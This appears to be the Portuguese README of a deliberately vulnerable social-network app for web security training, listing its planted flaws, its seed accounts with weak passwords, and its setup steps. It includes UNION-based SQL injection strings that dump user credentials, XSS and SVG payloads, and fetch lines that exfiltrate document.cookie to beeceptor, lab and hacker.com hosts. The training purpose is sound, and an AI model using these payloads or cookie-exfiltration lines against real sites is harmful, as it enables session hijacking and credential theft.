# Damn Vulnerable Social Network

Uma aplicação vulnerável indicada para testes e entendimento de conceitos de segurança em Aplicações WEB

Requisitos:
- Java 17
- Node 19
- Docker
- Docker Compose
- Postgres instalado. (Caso não tenha o Docker e Docker Compose)

## Rodar a aplicação

### 1. Subir o banco de dados utilizando o Docker Compose. Rodar o comando abaixo na pasta raíz do projeto.
```
docker-compose up
```

### 2. Criação do banco de dados.

- Entrar na pasta **dvsn** e executar o script:
```bash
$ ./create-database.sh
```

### 3. Entrar na pasta do front (dvsn-client) e dar build no projeto, para que os arquivos sejam colocados ná pasta estática da api.

NPM:
```
npm install
npm build
```
YARN:
```
yarn
yarn build
```

### 4. Abrir o IntelliJ e rodar a aplicação.
Main Class -> RootApplication.java

## Usuários disponíveis
|Email|Hash Senha|Senha|Admin|
|-|-|-|-|
|bob@mail.com|0acf4539a14b3aa27deeb4cbdf6e989f|michael|Sim|
|jimi@mail.com|061fba5bdfc076bb7362616668de87c8|lovely|Não|
|jim@mail.com|5f4dcc3b5aa765d61d8327deb882cf99|password|Não|
|amy@mail.com|d8578edf8458ce06fbc5bb76a58c5ca4|qwerty|Não|
|janis@mail.com|46f94c8de14fb36680850768ff1b7f2a|123qwe|Não|



## Comandos extras:
Gerar certificado para o servidor apache2.
```sh
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

## Assuntos abordados:

- OWASP TOP 10
- XSS
- CSRF
- Cookies (HttpOnly, Secure, SameSite)
- Alguns cuidados com LocalStorage e SessionStorage
- Como manter componentes/frameworks/libs seguras e atualizadas
- Cabeçalhos CSP e X-Frame-Options

## Software Composition Analysis (SCA)
- NodeJS/JavaScript: <a href="https://www.npmjs.com/package/yarn-audit-html">yarn audit html report</a>

## Vulnerabilidades
- SQL Injection
    - Login
    - Pesquisa de usuários
- XSS
    - Reflected
        - /hello?nome=Bob
    - DOM
        - Filtro na listagem de POSTS
    - Stored
        - Comentários dos posts    
- Cookie
    - É apenas um base64 e a aplicação confia no que o cliente envia.

fetch('https://servidor-de-log.free.beeceptor.com/todos?cookie=' +  document.cookie)
fetch('http://logger.crescer.lab/?cookie=' +  document.cookie)

## Payloads:
- XSS
```html
<img src="a" onerror="alert('XSS')" />
```
- SVG
```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("XSS");
  </script>
</svg>
```
- SQL Injection (Login)
- SQL Injection (Lista de usuários)
```sql
' union select 1, '2', '3', '4', '5', '6', 1, now(), now()--
```
```sql
' union select floor(random() * 1000), '2', table_name, '4', '5', '6', 1,now(), now() from information_schema.tables where table_schema = 'public'--
```
```sql
' union select floor(random() * 1000), table_name, column_name, '4', '5', '6', 1,now(), now() from information_schema.columns where table_schema = 'public'--
```
```sql
' union select floor(random() * 1000), '2', string_agg(column_name,','), '4', '5', '6', 1,now(), now() from information_schema.columns where table_name = 'usuario'--
```
```sql
' union select floor(random() * 1000), '2', concat(email,' ' ,senha), '4', '5', '6', 1,now(), now() from usuario--
```

https://github.com/payloadbox/sql-injection-payload-list
- CSS Injection
/hello?nome=Teste#red;margin-left:50px;background-image:url('http://localhost:8080/favicon.ico')
- expression(document.write('<iframe src=" .= "http://hacker.com?cookie=' + document.cookie.escape() + " />'))
background-image: url(javascript:alert('XSS'))
https://www.mediawiki.org/wiki/Preventing_XSS_Attacks_through_CSS_Whitelisting

## TODO
- <s>Prevenção de XSS configurável.</s>
- <s>Prevenção de SQL Injection configurável.</s>
- <s>Adicionar XSS em SVG e CSS.</s>
- <s>Validar tipos de autenticação e adicionar Token Opaco.</s>
- Adicionar cabeçalhos CSP e X-Frame-Options configuráveis.
- Adicionar certificados SSL.


## Exemplos de vulnerabilidades:
- <a href="https://security.snyk.io/vuln/SNYK-JS-MATERIALIZECSS-2324800">XSS materialize-css</a>

## Referências
https://developer.mozilla.org/pt-BR/docs/Web/JavaScript/Reference/Global_Objects/eval
https://github.com/payloadbox/xss-payload-list
